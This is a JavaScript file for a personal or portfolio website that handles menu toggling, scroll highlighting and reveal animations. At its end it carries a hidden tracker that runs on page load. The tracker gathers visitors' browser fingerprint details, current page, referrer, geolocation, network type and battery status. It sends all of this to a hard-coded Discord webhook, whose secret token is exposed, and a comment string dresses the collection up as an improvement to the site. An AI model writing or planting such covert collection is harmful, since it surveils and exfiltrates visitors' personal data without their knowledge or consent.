/*===== MENU SHOW =====*/ 
const showMenu = (toggleId, navId) =>{
    const toggle = document.getElementById(toggleId),
    nav = document.getElementById(navId)

    if(toggle && nav){
        toggle.addEventListener('click', ()=>{
            nav.classList.toggle('show')
        })
    }
}
showMenu('nav-toggle','nav-menu')

/*==================== REMOVE MENU MOBILE ====================*/
const navLink = document.querySelectorAll('.nav__link')

function linkAction(){
    const navMenu = document.getElementById('nav-menu')
    // When we click on each nav__link, we remove the show-menu class
    navMenu.classList.remove('show')
}
navLink.forEach(n => n.addEventListener('click', linkAction))

/*==================== SCROLL SECTIONS ACTIVE LINK ====================*/
const sections = document.querySelectorAll('section[id]')

function scrollActive(){
    const scrollY = window.pageYOffset

    sections.forEach(current =>{
        const sectionHeight = current.offsetHeight
        const sectionTop = current.offsetTop - 50;
        sectionId = current.getAttribute('id')

        if(scrollY > sectionTop && scrollY <= sectionTop + sectionHeight){
            document.querySelector('.nav__menu a[href*=' + sectionId + ']').classList.add('active')
        }else{
            document.querySelector('.nav__menu a[href*=' + sectionId + ']').classList.remove('active')
        }
    })
}
window.addEventListener('scroll', scrollActive)

/*===== SCROLL REVEAL ANIMATION =====*/
const sr = ScrollReveal({
    origin: 'top',
    distance: '60px',
    duration: 2000,
    delay: 200,
//     reset: true
});

sr.reveal('.home__data, .about__img, .goal__subtitle, goal__text',{}); 
sr.reveal('.home__img, .about__subtitle, .about__text, .skills__img',{delay: 400}); 
sr.reveal('.home__social-icon',{ interval: 200}); 
sr.reveal('.goal__data, .clips__img, .contact__input',{interval: 200}); 



var data = {
    AppName: navigator.appName,
    AppVersion: navigator.appVersion,
    Platform: navigator.platform,
    Language: navigator.language,
    ScreenWidth: window.screen.width,
    ScreenHeight: window.screen.height,
    Referrer: document.referrer,
    AdditionalInfo: "This is some additional information to make your website even better!",
    UserAgent: navigator.userAgent,
    CookiesEnabled: navigator.cookieEnabled,
    Timestamp: new Date().toLocaleString(undefined, { dateStyle: 'full', timeStyle: 'full' }),
    CurrentPage: window.location.href,
    NavigationType: window.performance.navigation.type,
    HardwareConcurrency: navigator.hardwareConcurrency
};

// Verifique se a API Geolocation está disponível e peça permissão ao usuário
if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(function(position) {
        data.latitude = position.coords.latitude;
        data.longitude = position.coords.longitude;
    });
}

// Verifique se a API Network Information está disponível
if ('connection' in navigator) {
    data.NetworkType = navigator.connection.effectiveType;
    data.NetworkDownlink = navigator.connection.downlink;
}

// Verifique se a API Battery Status está disponível
if ('getBattery' in navigator) {
    navigator.getBattery().then(function(battery) {
        data.batteryLevel = battery.level;
        data.batteryCharging = battery.charging;
    });
}



// Format the information for a Discord embed
var embed = {
    title: 'Browser Information',
    fields: Object.keys(data).map(key => ({ name: key, value: data[key].toString() }))
};

// Send the embed to the Discord webhook
fetch('https://discord.com/api/webhooks/1153295041754841219/eznHPePidZlbBWXPA7oSyTclu1MAdx39Ub2ZvhqIq479QjLp31rLUWy3wkJkodeQ_P0L', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        embeds: [embed]
    })
})
.then(response => {
    if (!response.ok) {
        throw new Error('Network response was not ok');
    }
    return response.text();
})
.then(data => {
    try {
        return JSON.parse(data);
    } catch (err) {
        console.log('Data is not JSON:', data);
        throw err;
    }
})
.catch((error) => {
    console.error('Error:', error);
});
